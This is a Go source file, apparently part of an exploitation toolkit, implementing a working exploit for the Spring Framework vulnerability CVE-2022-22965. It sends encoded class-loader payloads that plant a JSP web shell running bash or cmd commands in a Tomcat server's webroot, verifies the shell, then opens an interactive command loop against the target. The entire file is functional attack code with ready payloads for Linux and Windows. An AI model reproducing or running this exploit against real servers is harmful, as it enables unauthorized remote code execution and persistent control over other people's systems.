package exppackage

import (
	"bufio"
	"fmt"
	"github.com/dlclark/regexp2"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"os"
	"ssp/common"
	"strings"
	"time"
)

func CVE_2022_22965(url string) {
	oldHeaders1 := map[string]string{
		"User-Agent": common.GetRandomUserAgent(),
		"prefix":     "<%",
		"suffix":     "%>//",
		"c":          "Runtime",
		"c1":         "Runtime",
		"c2":         "<%",
		"DNT":        "1",
	}

	oldHeaders2 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	headers1 := common.MergeHeaders(oldHeaders1)
	headers2 := common.MergeHeaders(oldHeaders2)

	payloadLinux := `class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`

	payloadWin := `class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`

	payloadHTTP := `?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`

	payloadOther := `class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`

	fileDateData := "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"

	getPayload := url + payloadHTTP

	client := &http.Client{
		Timeout: 6 * time.Second,
	}

	req, err := http.NewRequest("POST", url, strings.NewReader(fileDateData))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers2 {
		req.Header.Set(key, value)
	}
	resp, err := client.Do(req)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp.Body.Close()
	time.Sleep(500 * time.Millisecond)

	req, err = http.NewRequest("POST", url, strings.NewReader(payloadOther))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers2 {
		req.Header.Set(key, value)
	}
	resp, err = client.Do(req)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp.Body.Close()
	time.Sleep(500 * time.Millisecond)

	req, err = http.NewRequest("POST", url, strings.NewReader(payloadLinux))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers1 {
		req.Header.Set(key, value)
	}
	resp, err = client.Do(req)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp.Body.Close()
	time.Sleep(500 * time.Millisecond)

	req, err = http.NewRequest("POST", url, strings.NewReader(payloadWin))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers1 {
		req.Header.Set(key, value)
	}
	resp, err = client.Do(req)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp.Body.Close()
	time.Sleep(500 * time.Millisecond)

	req, err = http.NewRequest("GET", getPayload, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers1 {
		req.Header.Set(key, value)
	}
	resp, err = client.Do(req)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp.Body.Close()
	time.Sleep(500 * time.Millisecond)

	req, err = http.NewRequest("GET", url+"tomcatwar.jsp", nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers1 {
		req.Header.Set(key, value)
	}
	resp, err = client.Do(req)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	shellURL := url + "tomcatwar.jsp?pwd=j&cmd=whoami"
	if resp.StatusCode == 200 && strings.Contains(string(body), "getRuntime().exec") {
		common.PrintVulnerabilityConfirmation("CVE_2022_22965", url, shellURL, "5")
		for {
			var Cmd string
			reader := bufio.NewReader(os.Stdin)

			fmt.Print("shell > ")
			Cmd, _ = reader.ReadString('\n')
			Cmd = strings.TrimSpace(Cmd)
			Cmd = strings.Replace(Cmd, " ", "%20", -1)
			if Cmd == "exit" {
				os.Exit(0)
			}
			urlShell := fmt.Sprintf("%stomcatwar.jsp?pwd=j&cmd=%s", url, Cmd)
			req, err = http.NewRequest("GET", urlShell, nil)
			if err != nil {
				fmt.Println("Error creating request:", err)
				return
			}
			resp, err = client.Do(req)
			if err != nil {
				color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
				return
			}
			defer resp.Body.Close()
			if resp != nil && resp.StatusCode == 500 {
				color.Yellow("[-] 重发包返回状态码500，请手动尝试利用WebShell：tomcatwar.jsp?pwd=j&cmd=whoami")
				break
			} else if resp != nil {
				defer resp.Body.Close()
				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println("Error reading response:", err)
					return
				}
				re, err := regexp2.Compile(`[^/]+(?=//)`, 0)
				if err != nil {
					fmt.Println("Error compiling regexp:", err)
					return
				}
				match, _ := re.FindStringMatch(string(body))
				if match != nil {
					fmt.Println(match.String())
				}
			}
		}
	} else {
		color.Yellow("[-] %s 未发现CVE-2022-22965远程命令执行漏洞\n", url)
	}
}
